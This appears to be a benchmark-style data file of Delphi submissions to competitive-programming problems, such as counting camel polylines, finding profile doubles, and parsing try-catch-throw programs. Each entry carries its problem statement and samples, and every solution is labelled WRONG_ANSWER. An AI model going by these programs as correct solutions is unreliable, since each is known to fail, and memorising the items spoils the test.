{"difficulty":1900,"lang":"Delphi","lang_cluster":"delphi","src_uid":"14_E","submission_id":"65106","tags":["dp"],"exec_outcome":"WRONG_ANSWER","source_code":"const\r\n  maxn = 61;\r\nvar\r\n  f:array[0..maxn, 0..maxn, 1..4] of int64;\r\n  n,k,i,j,q,w:longint;\r\nbegin\r\n{  assign(input, 'input.txt');\r\n  reset(input);\r\n  assign(output, 'output.txt');\r\n  rewrite(output);}\r\n  read(n, k);\r\n  f[1, 1, 1]:=1;\r\n  f[1, 1, 2]:=1;\r\n  f[1, 1, 3]:=1;\r\n  for i:=1 to n do for j:=1 to 2*k do for q:=1 to 4 do for w:=1 to 4 do if q <> w then\r\n  begin\r\n    if odd(j) then\r\n    begin\r\n      if q<w then inc(f[i+1, j, w], f[i, j, q]) else inc(f[i+1, j+1, w], f[i, j, q]);\r\n    end else\r\n    begin\r\n      if q>w then inc(f[i+1, j, w], f[i, j, q]) else inc(f[i+1, j+1, w], f[i, j, q]);\r\n    end;\r\n  end;\r\n  if not odd(k) then w:=2*k+1 else w:=2*k;\r\n  writeln(f[n, w, 4]+f[n, w, 3]+f[n, w, 2]+f[n, w, 1]);\r\n  close(output);\r\nend.","description":"Bob likes to draw camels: with a single hump, two humps, three humps, etc. He draws a camel by connecting points on a coordinate plane. Now he's drawing camels with t humps, representing them as polylines in the plane. Each polyline consists of n vertices with coordinates (x1,y1), (x2,y2), ..., (xn,yn). The first vertex has a coordinate x1=1, the second \u2014 x2=2, etc. Coordinates yi might be any, but should satisfy the following conditions:  there should be t humps precisely, i.e. such indexes j (2\u2264j\u2264n-1), so that yj-1<yj>yj+1,  there should be precisely t-1 such indexes j (2\u2264j\u2264n-1), so that yj-1>yj<yj+1,  no segment of a polyline should be parallel to the Ox-axis,  all yi are integers between 1 and 4. For a series of his drawings of camels with t humps Bob wants to buy a notebook, but he doesn't know how many pages he will need. Output the amount of different polylines that can be drawn to represent camels with t humps for a given number n.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a pair of integers n and t (3\u2264n\u226420, 1\u2264t\u226410).\n","output_spec":"Output the required amount of camels with t humps.\n","notes":"In the first sample test sequences of y-coordinates for six camels are: 123421, 123431, 123432, 124321, 134321 \u0438 234321 (each digit corresponds to one value of yi).\n","sample_inputs":["6 1\n","4 2\n"],"sample_outputs":["6\n","0\n"]}
{"difficulty":2300,"lang":"Delphi","lang_cluster":"delphi","src_uid":"154_C","submission_id":"1236246","tags":["graphs","hashing","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"program qwe;\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils,\r\n  Math;\r\n\r\ntype\r\n TArray = array[1..1000000] of integer;\r\n  \r\nconst\r\n base = 10000000009;\r\n p = 239017;\r\n\r\nprocedure swap(var x, y: integer);\r\nvar\r\n z: integer;\r\nbegin\r\n z := x;\r\n x := y;\r\n y := z;\r\nend;\r\n\r\nfunction sqrr(a, b: integer): int64;\r\nvar\r\n dega: int64;\r\nbegin\r\n dega := a;\r\n result := 1;\r\n while b > 0 do\r\n begin\r\n  if odd(b) then result := result * dega mod base;\r\n  dega := dega * dega mod base;\r\n  b := b div 2;\r\n end;\r\nend;\r\n\r\nvar\r\n n, m, x, y: integer;\r\n i: integer;\r\n a, b: TArray;\r\n vsp, ans: int64;\r\n\r\nprocedure QSort(var a: TArray; l, r: integer);\r\nvar\r\n i, j, x: integer;\r\nbegin\r\n if l >= r then exit;\r\n i := l;\r\n j := r;\r\n x := a[l + random(r - l + 1)];\r\n repeat\r\n  while a[i] < x do inc(i);\r\n  while a[j] > x do dec(j);\r\n  if i <= j then\r\n  begin\r\n   swap(a[i], a[j]);\r\n   inc(i);\r\n   dec(j);\r\n  end;\r\n until i > j;\r\n QSort(a, l, j);\r\n QSort(a, i, r);\r\nend;\r\n\r\nbegin\r\n randomize;\r\n readln(n, m);\r\n ans := 0;\r\n fillchar(a, sizeof(a), 0);\r\n for i := 1 to m do\r\n begin\r\n  readln(x, y);\r\n  vsp := sqrr(p, x);\r\n  a[y] := (a[y] + vsp) mod base;\r\n  vsp := sqrr(p, y);\r\n  a[x] := (a[x] + vsp) mod base;\r\n end;\r\n for i := 1 to n do\r\n begin\r\n  vsp := sqrr(p, i);\r\n  b[i] := (a[i] + vsp) mod base;\r\n end;\r\n QSort(a, 1, n);\r\n QSort(b, 1, n);\r\n i := 1;\r\n while i <= n do\r\n begin\r\n  m := 0;\r\n  while (i < n) and (a[i] = a[i + 1]) do\r\n  begin\r\n   inc(i);\r\n   inc(m);\r\n  end;\r\n  vsp := m;\r\n  vsp := vsp * (m + 1);\r\n  vsp := vsp div 2;\r\n  ans := ans + vsp;\r\n  inc(i);\r\n end;\r\n i := 1;\r\n while i <= n do\r\n begin\r\n  m := 0;\r\n  while (i < n) and (b[i] = b[i + 1]) do\r\n  begin\r\n   inc(i);\r\n   inc(m);\r\n  end;\r\n  vsp := m;\r\n  vsp := vsp * (m + 1);\r\n  vsp := vsp div 2;\r\n  ans := ans + vsp;\r\n  inc(i);\r\n end;\r\n writeln(ans);\r\nend.","description":"You have been offered a job in a company developing a large social network. Your first task is connected with searching profiles that most probably belong to the same user.The social network contains n registered profiles, numbered from 1 to n. Some pairs there are friends (the \"friendship\" relationship is mutual, that is, if i is friends with j, then j is also friends with i). Let's say that profiles i and j (i\u2260j) are doubles, if for any profile k (k\u2260i, k\u2260j) one of the two statements is true: either k is friends with i and j, or k isn't friends with either of them. Also, i and j can be friends or not be friends.Your task is to count the number of different unordered pairs (i,j), such that the profiles i and j are doubles. Note that the pairs are unordered, that is, pairs (a,b) and (b,a) are considered identical.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n and m (1\u2264n\u226410^6, 0\u2264m\u226410^6), \u2014 the number of profiles and the number of pairs of friends, correspondingly. \nNext m lines contains descriptions of pairs of friends in the format \"v u\", where v and u (1\u2264v,u\u2264n,v\u2260u) are numbers of profiles that are friends with each other. It is guaranteed that each unordered pair of friends occurs no more than once and no profile is friends with itself.\n","output_spec":"Print the single integer \u2014 the number of unordered pairs of profiles that are doubles. \nPlease do not use the %lld specificator to read or write 64-bit integers in \u0421++. It is preferred to use the %I64d specificator.\n","notes":"In the first and second sample any two profiles are doubles.\nIn the third sample the doubles are pairs of profiles (1,3) and (2,4).\n","sample_inputs":["3 3\n1 2\n2 3\n1 3\n","3 0\n","4 1\n1 3\n"],"sample_outputs":["3\n","3\n","2\n"]}
{"difficulty":1900,"lang":"Delphi","lang_cluster":"delphi","src_uid":"158_E","submission_id":"1290503","tags":["*special","dp","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"var t, d : array[0..5000] of int64;\r\n    k, n, i, j : longint;\r\n    tt, time, ans : int64;\r\nbegin\r\n  readln(n, k);\r\n  for i := 1 to n do\r\n    readln(t[i], d[i]);\r\n  d[0] := 0;\r\n  for i := 1 to k do\r\n  begin\r\n    t[n + i] := 186401;\r\n    d[n + i] := 186401;\r\n  end;\r\n  ans := 0;\r\n  for i := 1 to n do\r\n  begin\r\n    tt := 1;\r\n    for j := 1 to i - 1 do\r\n    begin\r\n      time := t[j] - tt;\r\n      if t[j] > 86401 then time := 86401 - tt;\r\n      if time > ans then ans := time;\r\n      if tt < t[j] then tt := t[j];\r\n      tt := tt + d[j];\r\n    end;\r\n    for j := i + k to n do\r\n    begin\r\n      time := t[j] - tt;\r\n      if t[j] > 86401 then time := 86401 - tt;\r\n      if time > ans then ans := time;\r\n      if tt < t[j] then tt := t[j];\r\n      tt := tt + d[j];\r\n    end;\r\n    if i + k > n then\r\n    begin\r\n      time := 86401 - tt;\r\n      if time > ans then ans := time;\r\n    end;\r\n  end;\r\n  if n = 0 then ans := 86400;\r\n  writeln(ans);\r\nend.","description":"Cool J has recently become a businessman Mr. Jackson, and he has to make a lot of phone calls now. Today he has n calls planned. For each call we know the moment ti (in seconds since the start of the day) when it is scheduled to start and its duration di (in seconds). All ti are different. Mr. Jackson is a very important person, so he never dials anybody himself, all calls will be incoming.Mr. Jackson isn't Caesar and he can't do several things at once. If somebody calls him while he hasn't finished the previous conversation, Mr. Jackson puts the new call on hold in the queue. In this case immediately after the end of the current call Mr. Jackson takes the earliest incoming call from the queue and starts the conversation. If Mr. Jackson started the call at the second t, and the call continues for d seconds, then Mr. Jackson is busy at seconds t,t+1,...,t+d-1, and he can start a new call at second t+d. Note that if Mr. Jackson is not busy talking when somebody calls, he can't put this call on hold.Mr. Jackson isn't Napoleon either, he likes to sleep. So sometimes he allows himself the luxury of ignoring a call, as if it never was scheduled. He can ignore at most k calls. Note that a call which comes while he is busy talking can be ignored as well.What is the maximum number of seconds Mr. Jackson can sleep today, assuming that he can choose an arbitrary continuous time segment from the current day (that is, with seconds from the 1-st to the 86400-th, inclusive) when he is not busy talking?Note that some calls can be continued or postponed to the next day or even later. However, the interval for sleep should be completely within the current day.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains a pair of integers n, k (0\u2264k\u2264n\u22644000) separated by a space. Following n lines contain the description of calls for today. The description of each call is located on the single line and consists of two space-separated integers ti and di, (1\u2264ti,di\u226486400). All ti are distinct, the calls are given in the order of strict increasing ti.\nScheduled times of calls [ti, ti+di-1] can arbitrarily intersect.\n","output_spec":"Print a number from 0 to 86400, inclusive \u2014 the maximally possible number of seconds for Mr. Jackson to sleep today.\n","notes":"In the first sample the most convenient way is to ignore the first two calls.\nIn the second sample it is best to ignore the third call. In this case Mr. Jackson will have been speaking:\n  first call: from 1-st to 20000-th second,  second call: from 20001-st to 30000-th second,  fourth call: from 30001-st to 40000-th second (the third call is ignored),  fifth call: from 80000-th to 139999-th second. Thus, the longest period of free time is from the 40001-th to the 79999-th second.\n","sample_inputs":["3 2\n30000 15000\n40000 15000\n50000 15000\n","5 1\n1 20000\n10000 10000\n20000 20000\n25000 10000\n80000 60000\n"],"sample_outputs":["49999\n","39999\n"]}
{"difficulty":2000,"lang":"Delphi","lang_cluster":"delphi","src_uid":"164_B","submission_id":"3271039","tags":["two+pointers"],"exec_outcome":"WRONG_ANSWER","source_code":"{$R+,Q+,I+}\r\n{$apptype console}\r\nUses SysUtils,math;\r\nVar\r\n   a,b,p:Array[0..3000000] of Integer;\r\n   n,m,i,l,r,f1,f2,ans,t,r1:Integer;\r\nBegin\r\n   Read(n,m);\r\n   For i:=1 To n Do Read(a[i]);\r\n   For i:=1 To m Do Read(b[i]);\r\n   For i:=1 To m Do p[b[i]]:=i;\r\n   l:=1;\r\n   r:=1;\r\n   f1:=0;\r\n   f2:=0;\r\n   t:=0;\r\n   ans:=0;\r\n   r1:=0;\r\n   While True Do Begin\r\n      If l>n Then Break;\r\n      If r>n Then Begin\r\n         If f1=1 Then Break;\r\n         r:=1;\r\n         f1:=1;\r\n         Continue;\r\n      End;\r\n      If (l>r) and (f1=0) Then Begin\r\n         r:=r+1;\r\n         t:=0;\r\n         f2:=0;\r\n         Continue;\r\n      End;\r\n      If (l=r) and (f1=1) Then Begin\r\n         l:=l+1;\r\n         Continue;\r\n      End;\r\n      If f2=0 Then Begin\r\n         If p[a[r]]=0 Then Begin\r\n            l:=r+1;\r\n            r:=r+1;\r\n            If f1=1 Then Break;\r\n            t:=0;\r\n         End\r\n         Else Begin\r\n            If p[a[r]]<t Then Begin\r\n               If p[a[r]]>p[a[l]] Then Begin\r\n                  l:=l+1;\r\n                  \/\/While (l<=n) and (p[a[r]]>p[a[l]]) Do l:=l+1;\r\n                  If l=r Then t:=0;\r\n                  \/\/r1:=l;\r\n                  \/\/f2:=1;\r\n               End\r\n               Else Begin\r\n                  f2:=1;\r\n                  r1:=r-1;\r\n                  If f1=0 Then ans:=max(ans,r-l+1)\r\n                          Else ans:=max(ans,r+n-l+1);\r\n                  t:=p[a[r]];\r\n                  r:=r+1;\r\n               End;\r\n            End\r\n            Else Begin\r\n               If f1=0 Then ans:=max(ans,r-l+1)\r\n                       Else ans:=max(ans,r+n-l+1);\r\n               t:=p[a[r]];\r\n               r:=r+1;\r\n            End;\r\n         End;\r\n      End\r\n      Else Begin\r\n         If p[a[r]]=0 Then Begin\r\n            l:=r+1;\r\n            r:=r+1;\r\n            If f1=1 Then Break;\r\n            f2:=0;\r\n            t:=0;\r\n         End\r\n         Else Begin\r\n            If p[a[r]]<t Then Begin\r\n               If f1=1 Then Break;\r\n               l:=r;\r\n               f2:=0;\r\n               t:=0;\r\n            End\r\n            Else Begin\r\n               If p[a[r]]>p[a[l]] Then Begin\r\n                  l:=l+1;\r\n                  If l>r1 Then Begin\r\n                     f2:=0;\r\n                     r1:=0;\r\n                  End;\r\n                  If l=r Then t:=0;\r\n               End\r\n               Else Begin\r\n                  If f1=0 Then ans:=max(ans,r-l+1)\r\n                          Else ans:=max(ans,r+n-l+1);\r\n                  t:=p[a[r]];\r\n                  r:=r+1;\r\n               End;\r\n            End;\r\n         End;\r\n      End;\r\n   End;\r\n   Write(ans);\r\nEnd.\r\n","description":"Polycarpus enjoys studying Berland hieroglyphs. Once Polycarp got hold of two ancient Berland pictures, on each of which was drawn a circle of hieroglyphs. We know that no hieroglyph occurs twice in either the first or the second circle (but in can occur once in each of them).Polycarpus wants to save these pictures on his laptop, but the problem is, laptops do not allow to write hieroglyphs circles. So Polycarp had to break each circle and write down all of its hieroglyphs in a clockwise order in one line. A line obtained from the first circle will be called a, and the line obtained from the second one will be called b.There are quite many ways to break hieroglyphic circles, so Polycarpus chooses the method, that makes the length of the largest substring of string a, which occurs as a subsequence in string b, maximum.Help Polycarpus \u2014 find the maximum possible length of the desired substring (subsequence) if the first and the second circles are broken optimally.The length of string s is the number of characters in it. If we denote the length of string s as |s|, we can write the string as s=s1s2... s|s|.A substring of s is a non-empty string x=s[a... b]=sasa+1... sb (1\u2264a\u2264b\u2264|s|). For example, \"code\" and \"force\" are substrings of \"codeforces\", while \"coders\" is not. A subsequence of s is a non-empty string y=s[p1p2... p|y|]=sp1sp2... sp|y| (1\u2264p1<p2<...<p|y|\u2264|s|). For example, \"coders\" is a subsequence of \"codeforces\".","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers la and lb (1\u2264la,lb\u22641000000) \u2014 the number of hieroglyphs in the first and second circles, respectively.\nBelow, due to difficulties with encoding of Berland hieroglyphs, they are given as integers from 1 to 10^6.\nThe second line contains la integers \u2014 the hieroglyphs in the first picture, in the clockwise order, starting with one of them.\nThe third line contains lb integers \u2014 the hieroglyphs in the second picture, in the clockwise order, starting with one of them.\nIt is guaranteed that the first circle doesn't contain a hieroglyph, which occurs twice. The second circle also has this property.\n","output_spec":"Print a single number \u2014 the maximum length of the common substring and subsequence. If at any way of breaking the circles it does not exist, print 0.\n","notes":"In the first test Polycarpus picks a string that consists of hieroglyphs 5 and 1, and in the second sample \u2014 from hieroglyphs 1, 3 and 5.\n","sample_inputs":["5 4\n1 2 3 4 5\n1 3 5 6\n","4 6\n1 3 5 2\n1 2 3 4 5 6\n","3 3\n1 2 3\n3 2 1\n"],"sample_outputs":["2\n","3\n","2\n"]}
{"difficulty":1800,"lang":"Delphi","lang_cluster":"delphi","src_uid":"16_C","submission_id":"3011720","tags":["binary+search","number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"{$R+ Q+ I+}\r\n{$APPTYPE CONSOLE}\r\nuses\r\n  SysUtils;\r\nvar\r\n   a,b,x,y,l,r,m : int64;\r\nbegin\r\n    read(a,b,x,y);\r\n    l := 1;\r\n    r := 2000000000;\r\n    while l + 1 < r do begin\r\n          m := (l + r) div 2;\r\n          if (m*x > a) or (m*y > b) then r := m\r\n          else l := m;\r\n    end;\r\n    if (r*x <= a) and (r*y <= b) then begin\r\n        write(r*x,' ',r*y);\r\n        halt;\r\n    end;\r\n    if (l*x <= a) and (l*y <= b) then begin\r\n        write(l*x,' ',l*y);\r\n        halt;\r\n    end;\r\n    write(0,' ',0);\r\nend.","description":"Reca company makes monitors, the most popular of their models is AB999 with the screen size a\u00d7b centimeters. Because of some production peculiarities a screen parameters are integer numbers. Recently the screen sides ratio x:y became popular with users. That's why the company wants to reduce monitor AB999 size so that its screen sides ratio becomes x:y, at the same time they want its total area to be maximal of all possible variants. Your task is to find the screen parameters of the reduced size model, or find out that such a reduction can't be performed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains 4 integers \u2014 a, b, x and y (1\u2264a,b,x,y\u22642\u00b710^9).\n","output_spec":"If the answer exists, output 2 positive integers \u2014 screen parameters of the reduced size model. Output 0 0 otherwise.\n","notes":null,"sample_inputs":["800 600 4 3\n","1920 1200 16 9\n","1 1 1 2\n"],"sample_outputs":["800 600\n","1920 1080\n","0 0\n"]}
{"difficulty":1800,"lang":"Delphi","lang_cluster":"delphi","src_uid":"173_B","submission_id":"1770059","tags":["dfs+and+similar","shortest+paths"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project1;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n\r\ntype\r\n  node = record\r\n    res, y, x : integer;\r\n  end;\r\n\r\nvar\r\n  n, m, i, j, top, l, r, minn : integer;\r\n  a : array[1..1100, 1..1100] of char;\r\n  b : array[1..1100, 1..1100] of integer;\r\n  q : array[1..1100000] of node;\r\n  u : node;\r\n\r\nfunction pop : node;\r\nbegin\r\n  inc(l);\r\n  result := q[l - 1];\r\nend;\r\n\r\nprocedure push(res, y, x : integer);\r\nbegin\r\n  inc(r);\r\n  q[r].res := res;\r\n  q[r].y := y;\r\n  q[r].x := x;\r\n  b[y][x] := res;\r\nend;\r\n\r\nbegin\r\n\/\/  reset(input, 'input.txt');\r\n\/\/  rewrite(output, 'output.txt');\r\n\r\n  readln(n, m);\r\n  for i := 1 to n do begin\r\n    for j := 1 to m do begin\r\n      read(a[i][j]);\r\n      b[i][j] := maxint;\r\n    end;\r\n    readln;\r\n  end;\r\n\r\n  l := 1;\r\n  for i := 1 to m do\r\n    if a[n][i] = '#' then\r\n      push(0, n, i);\r\n\r\n  while l <= r do begin\r\n    u := pop;\r\n    for i := u.y - 1 downto 1 do begin\r\n      if (a[i][u.x] = '#') and (b[i][u.x] > u.res) then\r\n        push(u.res + 1, i, u.x);\r\n      if (a[i][u.x] = '#') and (b[i][u.x] <= u.res) then\r\n        break;\r\n    end;\r\n    for i := u.y + 1 to n do begin\r\n      if (a[i][u.x] = '#') and (b[i][u.x] > u.res) then\r\n        push(u.res + 1, i, u.x);\r\n      if (a[i][u.x] = '#') and (b[i][u.x] <= u.res) then\r\n        break;\r\n    end;\r\n    for i := u.x - 1 downto 1 do begin\r\n      if (a[u.y][i] = '#') and (b[u.y][i] > u.res) then\r\n        push(u.res + 1, u.y, i);\r\n      if (a[u.y][i] = '#') and (b[u.y][i] <= u.res) then\r\n        break;\r\n    end;\r\n    for i := u.x + 1 to m do begin\r\n      if (a[u.y][i] = '#') and (b[u.y][i] > u.res) then\r\n        push(u.res + 1, u.y, i);\r\n      if (a[u.y][i] = '#') and (b[u.y][i] <= u.res) then\r\n        break;\r\n    end;\r\n  end;\r\n\r\n  minn := maxint;\r\n  for i := 1 to m do\r\n    if (b[1][i] < minn) and (a[i][j] = '#') then\r\n      minn := b[1][i];\r\n\r\n  if minn <> maxint then\r\n    writeln(minn + 1)\r\n  else\r\n    writeln(-1);  \r\n\r\n  readln;readln;\r\nend.\r\n","description":"\"The Chamber of Secrets has been opened again\" \u2014 this news has spread all around Hogwarts and some of the students have been petrified due to seeing the basilisk. Dumbledore got fired and now Harry is trying to enter the Chamber of Secrets. These aren't good news for Lord Voldemort. The problem is, he doesn't want anybody to be able to enter the chamber. The Dark Lord is going to be busy sucking life out of Ginny.The Chamber of Secrets is an n\u00d7m rectangular grid in which some of the cells are columns. A light ray (and a basilisk's gaze) passes through the columns without changing its direction. But with some spell we can make a column magic to reflect the light ray (or the gaze) in all four directions when it receives the ray. This is shown in the figure below.   The left light ray passes through a regular column, and the right ray \u2014 through the magic column. The basilisk is located at the right side of the lower right cell of the grid and is looking to the left (in the direction of the lower left cell). According to the legend, anyone who meets a basilisk's gaze directly dies immediately. But if someone meets a basilisk's gaze through a column, this person will get petrified. We know that the door to the Chamber is located on the left side of the upper left corner of the grid and anyone who wants to enter will look in the direction of its movement (in the direction of the upper right cell) from that position.   This figure illustrates the first sample test. Given the dimensions of the chamber and the location of regular columns, Lord Voldemort has asked you to find the minimum number of columns that we need to make magic so that anyone who wants to enter the chamber would be petrified or just declare that it's impossible to secure the chamber.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integer numbers n and m (2\u2264n,m\u22641000). Each of the next n lines contains m characters. Each character is either \".\" or \"#\" and represents one cell of the Chamber grid. It's \".\" if the corresponding cell is empty and \"#\" if it's a regular column.\n","output_spec":"Print the minimum number of columns to make magic or -1 if it's impossible to do.\n","notes":"The figure above shows the first sample test. In the first sample we should make both columns magic. The dragon figure represents the basilisk and the binoculars represent the person who will enter the Chamber of secrets. The black star shows the place where the person will be petrified. Yellow lines represent basilisk gaze moving through columns.\n","sample_inputs":["3 3\n.#.\n...\n.#.\n","4 3\n##.\n...\n.#.\n.#.\n"],"sample_outputs":["2\n","2\n"]}
{"difficulty":1800,"lang":"Delphi","lang_cluster":"delphi","src_uid":"174_C","submission_id":"1942314","tags":["data+structures","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project2;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n\r\nvar\r\n  down, up, a : array[1..100000] of integer;\r\n  i, j, n, topup, topdown : integer;\r\n\r\nprocedure pushup(u : integer);\r\nbegin\r\n  inc(topup);\r\n  up[topup] := u;\r\nend;\r\n\r\nprocedure pushdown(u : integer);\r\nbegin\r\n  inc(topdown);\r\n  down[topdown] := u;\r\nend;\r\n\r\nbegin\r\n\/\/  reset(input, 'input.txt');\r\n\/\/  rewrite(output, 'output.txt');\r\n\r\n  readln(n);\r\n  for i := 1 to n + 1 do begin\r\n    read(a[i]);\r\n    if a[i - 1] < a[i] then\r\n      for j := 1 to a[i] - a[i - 1] do\r\n        pushup(i);\r\n    if a[i - 1] > a[i] then\r\n      for j := 1 to a[i - 1] - a[i] do\r\n        pushdown(i - 1);\r\n  end;\r\n\r\n  writeln(topup);\r\n\r\n  for i := 1 to topup do\r\n    writeln(up[i], ' ', down[i]);\r\n\r\nend.\r\n","description":"Polycarpus is an amateur programmer. Now he is analyzing a friend's program. He has already found there the function rangeIncrement(l, r), that adds 1 to each element of some array a for all indexes in the segment [l,r]. In other words, this function does the following: function rangeIncrement(l, r)    for i := l .. r do        a[i] = a[i] + 1Polycarpus knows the state of the array a after a series of function calls. He wants to determine the minimum number of function calls that lead to such state. In addition, he wants to find what function calls are needed in this case. It is guaranteed that the required number of calls does not exceed 10^5.Before calls of function rangeIncrement(l, r) all array elements equal zero.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains a single integer n (1\u2264n\u226410^5) \u2014 the length of the array a[1... n]. \nThe second line contains its integer space-separated elements, a[1],a[2],...,a[n] (0\u2264a[i]\u226410^5) after some series of function calls rangeIncrement(l, r). \nIt is guaranteed that at least one element of the array is positive. It is guaranteed that the answer contains no more than 10^5 calls of function rangeIncrement(l, r).\n","output_spec":"Print on the first line t \u2014 the minimum number of calls of function rangeIncrement(l, r), that lead to the array from the input data. It is guaranteed that this number will turn out not more than 10^5.\nThen print t lines \u2014 the descriptions of function calls, one per line. Each line should contain two integers li,ri (1\u2264li\u2264ri\u2264n) \u2014 the arguments of the i-th call rangeIncrement(l, r). Calls can be applied in any order.\nIf there are multiple solutions, you are allowed to print any of them.\n","notes":"The first sample requires a call for the entire array, and four additional calls:\n  one for the segment [2,2] (i.e. the second element of the array),  three for the segment [5,5] (i.e. the fifth element of the array). ","sample_inputs":["6\n1 2 1 1 4 1\n","5\n1 0 1 0 1\n"],"sample_outputs":["5\n2 2\n5 5\n5 5\n5 5\n1 6\n","3\n1 1\n3 3\n5 5\n"]}
{"difficulty":1800,"lang":"Delphi","lang_cluster":"delphi","src_uid":"195_C","submission_id":"1805254","tags":["expression+parsing","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project2;\r\nVar k,i,n,j,j1,w:integer;\r\ns3,s2,s:string;\r\nbegin\r\n{  Assign(input,'input.txt');\r\n  Assign(output,'output.txt'); }\r\n  Readln(n);\r\n  k:=0; j:=0;\r\n  for i:=1 to n do\r\n  begin\r\n    Readln(s);\r\n    if (Pos('try',s)<>0)\r\n    then begin\r\n          if k=0\r\n          then inc(j)\r\n          else inc(j1)\r\n         end;\r\n    if Pos('throw',s)<>0\r\n    then begin\r\n         k:=i;\r\n         Delete(s,1,Pos('(',s));\r\n         while s[1]=' ' do\r\n         Delete(s,1,1);\r\n         Delete(s,Pos(')',s),Length(s)-Pos(')',s)+1);\r\n         while s[Length(s)]=' ' do\r\n         Delete(s,Length(s),1);\r\n         s2:=s;\r\n         end;\r\n    if Pos('catch',s)<>0\r\n    then begin\r\n          if (j1<>0)or(k=0)\r\n          then begin\r\n                if j1<>0\r\n                then dec(j1)\r\n                else Dec(j);\r\n               end \r\n          else begin\r\n                Delete(s,1,Pos('(',s));\r\n                while s[1]=' ' do\r\n                Delete(s,1,1);\r\n                w:=Pos(',',s)-1;\r\n                while s[w]=' ' do\r\n                Dec(w);\r\n                s3:=Copy(s,1,w);\r\n                if s3=s2\r\n                then begin\r\n                      Delete(s,1,Pos('\"',s));\r\n                      Writeln(Copy(s,1,pos('\"',s)-1));\r\n                      Halt;\r\n                     end;\r\n               end;\r\n         end;\r\n  end;\r\n  Writeln('Unhandled Exception');\r\nend.\r\n","description":"Vasya is developing his own programming language VPL (Vasya Programming Language). Right now he is busy making the system of exceptions. He thinks that the system of exceptions must function like that.The exceptions are processed by try-catch-blocks. There are two operators that work with the blocks: The try operator. It opens a new try-catch-block.  The catch(<exception_type>, <message>) operator. It closes the try-catch-block that was started last and haven't yet been closed. This block can be activated only via exception of type <exception_type>. When we activate this block, the screen displays the <message>. If at the given moment there is no open try-catch-block, then we can't use the catch operator.The exceptions can occur in the program in only one case: when we use the throw operator. The throw(<exception_type>) operator creates the exception of the given type.Let's suggest that as a result of using some throw operator the program created an exception of type a. In this case a try-catch-block is activated, such that this block's try operator was described in the program earlier than the used throw operator. Also, this block's catch operator was given an exception type a as a parameter and this block's catch operator is described later that the used throw operator. If there are several such try-catch-blocks, then the system activates the block whose catch operator occurs earlier than others. If no try-catch-block was activated, then the screen displays message \"Unhandled Exception\".To test the system, Vasya wrote a program that contains only try, catch and throw operators, one line contains no more than one operator, the whole program contains exactly one throw operator.Your task is: given a program in VPL, determine, what message will be displayed on the screen.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer: n (1\u2264n\u226410^5) the number of lines in the program. Next n lines contain the program in language VPL. Each line contains no more than one operator. It means that input file can contain empty lines and lines, consisting only of spaces.\nThe program contains only operators try, catch and throw. It is guaranteed that the program is correct. It means that each started try-catch-block was closed, the catch operators aren't used unless there is an open try-catch-block. The program has exactly one throw operator. The program may have spaces at the beginning of a line, at the end of a line, before and after a bracket, a comma or a quote mark.\nThe exception type is a nonempty string, that consists only of upper and lower case english letters. The length of the string does not exceed 20 symbols. Message is a nonempty string, that consists only of upper and lower case english letters, digits and spaces. Message is surrounded with quote marks. Quote marks shouldn't be printed. The length of the string does not exceed 20 symbols.\nLength of any line in the input file does not exceed 50 symbols. \n","output_spec":"Print the message the screen will show after the given program is executed.\n","notes":"In the first sample there are 2 try-catch-blocks such that try operator is described earlier than throw operator and catch operator is described later than throw operator: try-catch(BE,\"BE in line 3\") and try-catch(AE,\"AE somewhere\"). Exception type is AE, so the second block will be activated, because operator catch(AE,\"AE somewhere\") has exception type AE as parameter and operator catch(BE,\"BE in line 3\") has exception type BE.\nIn the second sample there are 2 try-catch-blocks such that try operator is described earlier than throw operator and catch operator is described later than throw operator: try-catch(AE,\"AE in line 3\") and try-catch(AE,\"AE somewhere\"). Exception type is AE, so both blocks can be activated, but only the first one will be activated, because operator catch(AE,\"AE in line 3\") is described earlier than catch(AE,\"AE somewhere\")\nIn the third sample there is no blocks that can be activated by an exception of type CE.\n","sample_inputs":["8\ntry\n    try\n        throw ( AE ) \n    catch ( BE, \"BE in line 3\")\n\n    try\n    catch(AE, \"AE in line 5\") \ncatch(AE,\"AE somewhere\")\n","8\ntry\n    try\n        throw ( AE ) \n    catch ( AE, \"AE in line 3\")\n\n    try\n    catch(BE, \"BE in line 5\") \ncatch(AE,\"AE somewhere\")\n","8\ntry\n    try\n        throw ( CE ) \n    catch ( BE, \"BE in line 3\")\n\n    try\n    catch(AE, \"AE in line 5\") \ncatch(AE,\"AE somewhere\")\n"],"sample_outputs":["AE somewhere\n","AE in line 3\n","Unhandled Exception\n"]}
